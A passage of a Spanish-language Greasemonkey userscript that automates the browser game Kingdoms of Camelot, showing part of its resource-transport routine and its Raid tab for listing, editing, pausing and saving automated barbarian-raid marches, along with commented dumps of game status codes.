		params.r4 = carry_Ore;
		params.gold = carry_Gold;
		params.u9 = wagons_needed;

   		if ((carry_Food + carry_Wood + carry_Stone + carry_Ore + carry_Gold) > 0) {

         new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
					method: "post",
					parameters: params,
					loading: true,
					onSuccess: function (transport) {
					var rslt = eval("(" + transport.responseText + ")");
					if (rslt.ok) {
					actionLog('Transporte desde: ' + cityname + "   A: " + xcoord + ',' + ycoord + "    ->   Carretas: " + wagons_needed);
					var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
					var ut = unsafeWindow.unixtime();
					var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
                    for(i = 0; i <= unitsarr.length; i++){
						if(params["u"+i]){
								unitsarr[i] = params["u"+i];
						}
					}
					var resources=new Array();
					resources[0] = params.gold;
					for(i=1; i<=4; i++){
							resources[i] = params["r"+i];
					}
					var currentcityid = city;
                  unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
					unsafeWindow.update_seed(rslt.updateSeed)
                  if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
						} else {
						actionLog('FALLO TRANSPORTE: ' + cityname + ' -> ' + rslt.msg);
                  //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
 						}
    },
	onFailure: function () {}
          });
        }
	},

	show: function(){
		var t = Tabs.transport;
    },
	hide: function(){
        var t = Tabs.transport;
    },
    onUnload: function(){
        var t = Tabs.transport;
		t.saveTradeRoutes();
		t.saveTraderState();

    },
}



/*********************************  Raid Tab ***********************************/
/************** Bot active
(object) queue_atkp = [object Object]
    (object) city73930 = [object Object]
      (object) m6093 = [object Object]
        (number) marchType = 9
        (number) marchStatus = 1
        (string) playerId = 1550996
        (string) cityId = 73930
        (string) botSettingsId = 1479
        (string) botMarchStatus = 1
        (string) botState = 1
        (string) modalState = 0
        (string) restPeriod = 3472
        (string) fromPlayerId = 1550996
        (string) fromCityId = 73930
        (string) fromAllianceId = 2199
        (string) fromXCoord = 159
        (string) fromYCoord = 638
        (undefined) toPlayerId: null = null
        (undefined) toCityId: null = null
        (undefined) toAllianceId: null = null
********/
/************* Bot returning
(object) queue_atkp = [object Object]
    (object) city73930 = [object Object]
      (object) m6093 = [object Object]
        (number) marchType = 9
        (number) marchStatus = 8
        (string) playerId = 1550996
        (string) cityId = 73930
        (string) botSettingsId = 1479
        (string) botMarchStatus = 1
        (string) botState = 1
        (string) modalState = 0
        (string) restPeriod = 3472
        (string) fromPlayerId = 1550996
        (string) fromCityId = 73930
        (string) fromAllianceId = 2199
        (string) fromXCoord = 159
        (string) fromYCoord = 638
        (undefined) toPlayerId: null = null
        (undefined) toCityId: null = null
        (undefined) toAllianceId: null = null
*****/
/******** Bot resting
(object) queue_atkp = [object Object]
    (object) city73930 = [object Object]
      (object) m6093 = [object Object]
        (string) marchType = 9
        (string) marchStatus = 4
        (string) playerId = 1550996
        (string) cityId = 73930
        (string) botSettingsId = 1479
        (string) botMarchStatus = 7
        (string) botState = 1
        (string) modalState = 0
        (string) restPeriod = 3472
        (string) fromPlayerId = 1550996
        (string) fromCityId = 73930
        (string) fromAllianceId = 2199
        (string) fromXCoord = 159
        (string) fromYCoord = 638
        (undefined) toPlayerId: null = null
        (undefined) toCityId: null = null
        (string) toTileId = 451239
        (undefined) toAllianceId: null = null
**********/
/************* March type cheat sheet
cm.BOT_STATUS = {
    BOT_MARCH_UNDEFINED: 0,
    BOT_MARCH_MARCHING: 1,
    BOT_MARCH_RETURNING: 2,
    BOT_MARCH_STOPPED: 3,
    BOT_MARCH_INSUFFICIENT_TROOPS: 4,
    BOT_MARCH_MAX_RAIDS_EXCEEDED: 5,
    BOT_MARCH_TIMED_OUT: 6,
    BOT_MARCH_RESTING: 7
};
cm.MARCH_STATUS = {
	    MARCH_STATUS_INACTIVE: 0,
	    MARCH_STATUS_OUTBOUND: 1,
	    MARCH_STATUS_DEFENDING: 2,
	    MARCH_STATUS_STOPPED: 3,
	    MARCH_STATUS_RESTING: 4,
	    MARCH_STATUS_UNKNOWN: 5,
	    MARCH_STATUS_SITUATIONCHANGED: 7,
	    MARCH_STATUS_RETURNING: 8,
	    MARCH_STATUS_ABORTING: 9
};
cm.MARCH_TYPES = {
    MARCH_TYPE_NONE: 0,
    MARCH_TYPE_TRANSPORT: 1,
    MARCH_TYPE_REINFORCE: 2,
    MARCH_TYPE_SCOUT: 3,
    MARCH_TYPE_ATTACK: 4,
    MARCH_TYPE_REASSIGN: 5,
    MARCH_TYPE_BARBARIAN: 6,
    MARCH_TYPE_MERCENARY: 7,
    MARCH_TYPE_BARBARIAN_REINFORCE: 8,
    MARCH_TYPE_BOT_BARBARIAN: 9
};
************/

 Tabs.Raid = {
  tabDisabled : false,
  tabOrder : 1,
  myDiv : null,
  rallypointlevel:null,
  knt:{},
  Troops:{},
  city:0,
  raidtimer:null,
  rslt:{},
  save:{},
  stopping:false,
  resuming:false,
  deleting:false,
  stopprogress:0,
  stopcount:0,
  activecount:0,
  count:0,

  init : function (div){
    var t = Tabs.Raid;
    t.myDiv = div;
	t.raidtimer = setTimeout(t.checkRaids, 30000);
	setInterval(t.lookup, 2500);
	setInterval(t.sendreport, 1*60*1000);

	AddSubTabLink('Parar Raid', t.StopAllRaids, 'pbraidtab');
	AddSubTabLink('Reanudar Raid', t.ResumeAllRaids, 'pbraidtabRes');
	AddSubTabLink('Borrar Raid', t.DeleteAllRaids, 'pbraidtabDel');


	var m = '<DIV class=pbStat>FUNCIONES RAID</div><TABLE width=100% height=0% class=pbTab><TR align="center">';
	    m += '<TD><INPUT id=pbRaidStart type=submit value="Auto Reset = '+ (Options.RaidRunning?'ON':'OFF') +'" ></td>';
 	    m += '<TD><INPUT id=pbsendreport type=checkbox '+ (Options.foodreport?' CHECKED':'') +'\> Enviar el informe de ataques Raid ';
	    m += 'Cada <INPUT id=pbsendreportint value='+ Options.MsgInterval +' type=text size=3 \> horas </td>';
		m += '</tr></table></div>';
	    m += '<DIV class=pbStat>ACTIVAR RAID</div><TABLE width=100% height=0% class=pbTab><TR align="center">';
	    m += '<TD><DIV style="margin-bottom:10px;"><span id=ptRaidCity></span></div></td></tr>';
	    m+='<TR><TD><DIV style="margin-bottom:10px;"><span id=ptRaidTimer></span></div></td></tr></table>';
	    m += '<DIV id=PaintRaids></div>';
	    m += '<DIV class=pbStat>GUARDAR RAID</div><TABLE width=100% height=0% class=pbTab><TR align="center">';
	    m += '<DIV id=SavedRaids></div>';
	t.myDiv.innerHTML = m;

	t.from = new CdispCityPicker ('ptRaidpicker', document.getElementById('ptRaidCity'), true, t.clickCitySelect, 0);
	document.getElementById('pbRaidStart').addEventListener('click', t.toggleRaidState, false);
	document.getElementById('pbsendreport').addEventListener('change', function(){
		Options.foodreport = document.getElementById('pbsendreport').checked;
		saveOptions();
	}, false);
	document.getElementById('pbsendreportint').addEventListener('change', function(){
		Options.MsgInterval = parseInt(document.getElementById('pbsendreportint').value);
		saveOptions();
	}, false);

	var serverID = getServerId();
	t.save = GM_getValue ('SavedRaids_'+serverID);
	if (t.save != undefined) t.save = JSON2.parse (t.save);

	setInterval (t.paint,1000);
  },

  lookup : function (){
		var t = Tabs.Raid;
		t.activecount=0;
      	t.stopcount=0;
      	for (c=0; c< Seed.cities.length;c++) {
      			cityID = 'city' + Seed.cities[c][0];
   				for (b in Seed.queue_atkp[cityID]){
   					destinationUnixTime = Seed.queue_atkp[cityID][b]['destinationUnixTime'];
   					MarchStatus = Seed.queue_atkp[cityID][b]['marchStatus'];
   					MarchType = Seed.queue_atkp[cityID][b]['marchType'];
   					botMarchStatus = Seed.queue_atkp[cityID][b]['botMarchStatus'];
   					if (MarchType == 9 &&  MarchStatus == 3 || MarchStatus==10) t.stopcount++;
   					else if (MarchType == 9) t.activecount++;
					//alert(MarchType +'/'+  MarchStatus);
   				}
   		}
		//logit(t.stopcount);
	   	if (t.resuming == false && t.stopping == false && t.deleting == false && t.activecount != 0)
			document.getElementById('pbraidtab').innerHTML = '<span style="color: #ff6">Parar ('+ t.activecount + ') Raid</span>';
	   	else if (t.resuming == false && t.stopping == false && t.deleting == false)
			document.getElementById('pbraidtab').innerHTML = '<span style="color: #CCC">Parar ('+ t.activecount + ') Raid</span>';
   		if (t.resuming == false && t.resuming == false && t.deleting == false && t.stopcount !=0)
			document.getElementById('pbraidtabRes').innerHTML = '<span style="color: #ff6">Reanudar ('+ t.stopcount + ') Raid</span>';
   		else if (t.resuming == false && t.stopping == false && t.deleting == false)
			document.getElementById('pbraidtabRes').innerHTML = '<span style="color: #CCC">Reanudar ('+ t.stopcount + ') Raid</span>';
   		if (t.resuming == false && t.stopping == false && t.deleting == false && t.stopcount !=0)
			document.getElementById('pbraidtabDel').innerHTML = '<span style="color: #ff6">Borrar ('+ t.stopcount + ') Raid</span>';
   		else if (t.resuming == false && t.stopping == false && t.deleting == false)
			document.getElementById('pbraidtabDel').innerHTML = '<span style="color: #CCC">Borrar ('+ t.stopcount + ') Raid</span>';
   },


  paint : function ()	{
	var t = Tabs.Raid;
	var botMarchStat = {0:'Inactivo',
  						1:'Atacando',
  						2:'Retornando',
  						3:'Parado',
  						4:'Descansando',
  						5:'Desconocido',
  						7:'Cambio de situación',
  						8:'Retornando',
  						9:'Abortando'};
  	var botStat = {0:'Indefinido',
  						1:'Marchando',
  						2:'Retornando',
  						3:'Parado',
  						4:'Tropas insuficientes',
  						5:'Excedido max. raid',
  						7:'Tiempo de espera',
  						8:'Descansando'};
  	var o = '<FONT size=2px><B>Tiempo de Raid: '+ timestr( 86400 - ( unixTime() - t.rslt.settings.lastUpdated )) +'</b></font>';
  	document.getElementById('ptRaidTimer').innerHTML = o;

  	var z ='<TABLE class=pbTab><TR><TD width=60px align=center><A onclick="pbStopAll()">PARAR</a></td><TD width=70px>Tiempo</td><TD width=85px>Coord.</td><TD width=50px>Nivel</td><TD width=50px></td><TD width=50px><A onclick="pbDeleteAll()">BORRAR</a></td></TR>';
  	if (t.rslt['queue'] != ""){
  		for (y in t.rslt['queue']) {
  			if (t.rslt['queue'][y]['botMarches'] != undefined) {
  				for (k in Seed.queue_atkp['city' + t.cityId]){
  					if (Seed.queue_atkp['city' + t.cityId][k]['marchId'] == t.rslt['queue'][y]['botMarches']['marchId']) {
  						botMarchStatus = Seed.queue_atkp['city' + t.cityId][k]['botMarchStatus'];
  						MarchStatus = Seed.queue_atkp['city' + t.cityId][k]['marchStatus'];
  						restPeriod = (Seed.queue_atkp['city' + t.cityId][k]['restPeriod']/60);
  						destinationUnixTime = Seed.queue_atkp['city' + t.cityId][k]['destinationUnixTime'];
  						returnUnixTime = Seed.queue_atkp['city' + t.cityId][k]['returnUnixTime']
  						now = unixTime();
  						//z+='<TR><TD>('+ botMarchStatus +'/'+ MarchStatus +')</td>';
						z+='<TR>';
  						//if (destinationUnixTime > now && botMarchStatus !=3) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg></td>';
  						if (MarchStatus ==1) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/attacking.jpg></td>';
  						//if ((destinationUnixTime - now) <= 0 && botMarchStatus !=3 && returnUnixTime > now) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg></td>';
  						if (MarchStatus ==8 && (destinationUnixTime - now) <= 0 && botMarchStatus !=3 && returnUnixTime > now) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/returning.jpg></td>';
  						if (MarchStatus == 3) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_stopped_desat.png></td>';
  						//if (returnUnixTime < now  && botMarchStatus !=3) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png></td>';
  						if (MarchStatus == 4 || (returnUnixTime < now  && botMarchStatus !=3)) z+='<TD align=center><img src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/autoAttack/raid_resting.png></td>';

  						if (destinationUnixTime >= now) z+='<TD>'+ timestr(Seed.queue_atkp['city' + t.cityId][k]['destinationUnixTime'] - unixTime())+'</td>';
  						if (destinationUnixTime <= now) {
  							if ((destinationUnixTime - now) <= 0 && returnUnixTime > now) z+='<TD>'+ timestr(returnUnixTime - now)+'</td>';
  							if (returnUnixTime <= now) z+='<TD>'+ timestr(now - returnUnixTime)+'</td>';
  						}
  					}
  				}
  				z+='<TD>('+ t.rslt['queue'][y]['botMarches']['toXCoord'] +','+ t.rslt['queue'][y]['botMarches']['toYCoord']+')</td>';
  				z+='<TD align=center>'+ t.rslt['queue'][y]['botMarches']['toTileLevel'] +'</td>';
  				if (botMarchStatus == 3) z+='<TD><A onclick="pbEditRaid('+ y +')">Editar</a></td>';
	  				else z+='<TD><FONT COLOR= "CCCCCC">Editar</font></td>';
  				if (botMarchStatus == 3) z+='<TD align=center><A onclick="pbDeleteRaid('+ t.rslt['queue'][y]['botMarches']['marchId']+')">Borrar</a></td>';
  				else z+='<TD align=center><FONT COLOR= "CCCCCC">Borrar</font></td>';
  				//z +='<TD width=25px></td><TD>Status: '+ botMarchStat[botMarchStatus]+'</td>';
  				z +='<TD width=25px></td><TD>Tiempo de Descanso: '+ timestr(restPeriod) +'</td>';
  				z+='</tr>';
  			}
  		}
  	}
  	z+='</table>';
  	if (t.rslt['queue'] == "") z ='<TABLE class=pbTab><TR><TD>No hay redadas en la ciudad!</td></TR>';
  	document.getElementById('PaintRaids').innerHTML = z;

 	var check = true;
  		if (t.save != ""){
  			var a ='<TABLE class=pbTab><TR><TD width=60px></td><TD width=70px></td><TD width=85px>Coords.</td><TD width=50px>Nivel</td><TD width=50px></td><TD width=50px></td></tr>';
  			for (y in t.save){
  				if (t.save[y] != undefined && t.cityId == t.save[y]['cityId']){
  					a +='<TR><TD align=center><A onclick="pbDeleteSavedRaid('+ t.save[y]['marchId'] +')">X</a></td>';
  					a +='<TD></td><TD><FONT COLOR= "CC0000">('+t.save[y]['toXCoord']+','+t.save[y]['toYCoord']+')</font></td>';
  					a +='<TD align=center>'+t.save[y]['toTileLevel']+'</td>';
  					a +='<TD><A onclick="pbEditSavedRaid('+ y +')">Editar</a></td>';
  					a +='<TD align=center><A onclick="pbAddRaid('+ t.save[y]['marchId']+')">Agregar</a></td></tr>';
  					check = false;
  				}
  			}
  			m+='</table>';
  		}

  	if (check) a ='<TABLE class=pbTab><TR><TD>No guardar redadas en la ciudad!</td></TR>';

  	document.getElementById('SavedRaids').innerHTML = a;

  	unsafeWindow.pbDeleteRaid = t.DeleteRaid;
  	unsafeWindow.pbEditRaid = t.EditRaid;
  	unsafeWindow.pbAddRaid = t.AddRaid;
  	unsafeWindow.pbDeleteSavedRaid = t.DeleteSavedRaid;
  	unsafeWindow.pbEditSavedRaid = t.EditSavedRaid;
  	unsafeWindow.pbStopAll = t.StopCityRaids;
  	unsafeWindow.pbDeleteAll = t.DeleteCityRaids;
  },

  DeleteSavedRaid : function (Id){
    	  var t = Tabs.Raid;
    	  for (yy=0;yy<t.save.length;yy++){
    	  	if (t.save[yy]['marchId'] == Id){
    	  		  t.save.splice (yy,1);
    	  	}
    	  }
    	  var serverID = getServerId();
    	  setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
    	  t.paint();
    },

  EditSavedRaid : function (y){
      var t = Tabs.Raid;
	  var pop = new CPopup ('pbEditRaid', 0,0, 750,350, true);
	  if (t.popFirst){
	    pop.centerMe (mainPop.getMainDiv());
	    t.popFirst = false;
	  }
	  pop.getTopDiv().innerHTML = '<CENTER><B>Editar Raid Guardado</b></center>';
	  cityId =  t.save[y]['cityId'];

		  var m = '<BR><TABLE id=pbRaidAdd height=0% class=pbTab><TR align="center">';
		  m+='<TR></tr><TR><TD width=25px>X= <INPUT id=toXCoord type=text size=3 maxlength=3 value='+t.save[y]['toXCoord']+'></td>';
		  m+='<TD width=10px></td><TD widht=25px>Y= <INPUT id=toYCoord type=text size=3 maxlength=3 value='+ t.save[y]['toYCoord'] +'></td>';
		  m+='<TD width=25px></td><TD>Ida y vuelta: '+ timestr((t.save[y]['returnUnixTime'] - t.save[y]['destinationUnixTime'])*2)+ '</td></tr></table>';

		  m += '<BR><TABLE id=pbRaidAdd width=100% height=0% class=pbTab><TR align="center">';
		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50.jpg?6545"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="'+ t.save[y]['unit1Count']+'"></td>';
		  m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="'+ t.save[y]['unit2Count']+'"></td>';
		  m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="'+ t.save[y]['unit3Count']+'"></td>';
		  m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="'+ t.save[y]['unit4Count']+'"></td></tr>';

		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50.jpg?6545"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="'+ t.save[y]['unit5Count']+'"></td>';
		  m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="'+ t.save[y]['unit6Count']+'"></td>';
		  m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="'+ t.save[y]['unit7Count']+'"></td>';
		  m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="'+ t.save[y]['unit8Count']+'"></td></tr>';

		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_50.jpg?6545"></td>';
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50.jpg?6545"></td>'
		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
		  m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="'+ t.save[y]['unit9Count']+'"></td>';
		  m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="'+ t.save[y]['unit10Count']+'"></td>';
		  m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="'+ t.save[y]['unit11Count']+'"></td>';
		  m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="'+ t.save[y]['unit12Count']+'"></td></tr></table>';

		  m += '<BR><CENTER><SELECT id=AddKnights type=list></select></center>';
		  m+= '<BR><CENTER>'+ strButton20('Save', 'id=pbSaveRaid') +'</center>';

	  pop.getMainDiv().innerHTML = m;

	  t.getKnights(cityId);

	  document.getElementById ('AddKnights').value =  t.save[y]['knightId'];
	  document.getElementById ('pbSaveRaid').addEventListener ('click', function(){
	  			t.save[y]['knightId'] = parseInt(document.getElementById ('AddKnights').value);
	  			t.save[y]['toXCoord'] = parseInt(document.getElementById ('toXCoord').value);
	  			t.save[y]['toYCoord'] = parseInt(document.getElementById ('toYCoord').value);
	  			t.save[y]['unit1Count'] = parseInt(document.getElementById ('Unit1').value);
	  			t.save[y]['unit2Count'] = parseInt(document.getElementById ('Unit2').value);
	  			t.save[y]['unit3Count'] = parseInt(document.getElementById ('Unit3').value);
	  			t.save[y]['unit4Count'] = parseInt(document.getElementById ('Unit4').value);
	  			t.save[y]['unit5Count'] = parseInt(document.getElementById ('Unit5').value);
	  			t.save[y]['unit6Count'] = parseInt(document.getElementById ('Unit6').value);
	  			t.save[y]['unit7Count'] = parseInt(document.getElementById ('Unit7').value);
	  			t.save[y]['unit8Count'] = parseInt(document.getElementById ('Unit8').value);
	  			t.save[y]['unit9Count'] = parseInt(document.getElementById ('Unit9').value);
	  			t.save[y]['unit10Count'] = parseInt(document.getElementById ('Unit10').value);
	  			t.save[y]['unit11Count'] = parseInt(document.getElementById ('Unit11').value);
	  			t.save[y]['unit12Count'] = parseInt(document.getElementById ('Unit12').value);
	  			var serverID = getServerId();
	  			setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
	  			pop.show (false);
	  }, false);

	  pop.show (true);
    },

  EditRaid : function (y){
 	  var t = Tabs.Raid;
  	  var pop = new CPopup ('pbEditRaid', 0,0, 750,350, true);
  	  if (t.popFirst){
  	    pop.centerMe (mainPop.getMainDiv());
  	    t.popFirst = false;
  	  }
  	  pop.getTopDiv().innerHTML = '<CENTER><B>Editar Raid</b></center>';
  	  cityId = t.rslt['queue'][y]['botMarches']['cityId'];

  		  var m = '<BR><TABLE id=pbRaidAdd height=0% class=pbTab><TR align="center">';
  		  m+='<TR></tr><TR><TD width=25px>X= <INPUT id=toXCoord type=text size=3 maxlength=3 value='+t.rslt['queue'][y]['botMarches']['toXCoord']+'></td>';
  		  m+='<TD width=10px></td><TD widht=25px>Y= <INPUT id=toYCoord type=text size=3 maxlength=3 value='+ t.rslt['queue'][y]['botMarches']['toYCoord'] +'></td>';
  		  m+='<TD width=25px></td><TD>Ida y vuelta: '+ timestr((t.rslt['queue'][y]['botMarches']['returnUnixTime'] - t.rslt['queue'][y]['botMarches']['destinationUnixTime'])*2)+ '</td></tr></table>';

  		  m += '<BR><TABLE id=pbRaidAdd width=100% height=0% class=pbTab><TR align="center">';
  		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50.jpg?6545"></td>';
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
  		  m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit1Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit2Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit3Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit4Count']+'"></td></tr>';

  		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50.jpg?6545"></td>';
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
  		  m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit5Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit6Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit7Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit8Count']+'"></td></tr>';

  		  m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_50.jpg?6545"></td>';
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
  		  m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50.jpg?6545"></td>'
  		  m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
  		  m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit9Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit10Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit11Count']+'"></td>';
  		  m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="'+ t.rslt['queue'][y]['botMarches']['unit12Count']+'"></td></tr></table>';

  		  m += '<BR><CENTER><SELECT id=AddKnights type=list></select></center>';
  		  m+= '<BR><CENTER>'+ strButton20('Save', 'id=pbRaidSave') +'</center>';

  	  pop.getMainDiv().innerHTML = m;

  	  t.getKnights(cityId);

  	  document.getElementById ('AddKnights').value =  t.rslt['queue'][y]['botMarches']['knightId'];
  	  document.getElementById ('pbRaidSave').addEventListener ('click', function(){
		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);

  		params.pf = 0;
  		params.ctrl = 'BotManager';
  		params.action = 'editMarch';
		params.settings = {};
  		params.settings.cityId = t.rslt['queue'][y]['botMarches']['fromCityId'];
  	  	params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};
  	  	params.queue[0].cityMarches.knightId = parseInt(document.getElementById ('AddKnights').value);
  	  	params.queue[0].cityMarches.toXCoord =  parseInt(document.getElementById ('toXCoord').value);
  	  	params.queue[0].cityMarches.toYCoord =  parseInt(document.getElementById ('toYCoord').value);
  	  	params.queue[0].cityMarches.unit0Count = 0; //document.getElementById ('Unit0').value;
  	  	params.queue[0].cityMarches.unit1Count =  parseInt(document.getElementById ('Unit1').value);
  	  	params.queue[0].cityMarches.unit2Count = parseInt(document.getElementById ('Unit2').value);
  	  	params.queue[0].cityMarches.unit3Count = parseInt(document.getElementById ('Unit3').value);
  	  	params.queue[0].cityMarches.unit4Count = parseInt(document.getElementById ('Unit4').value);
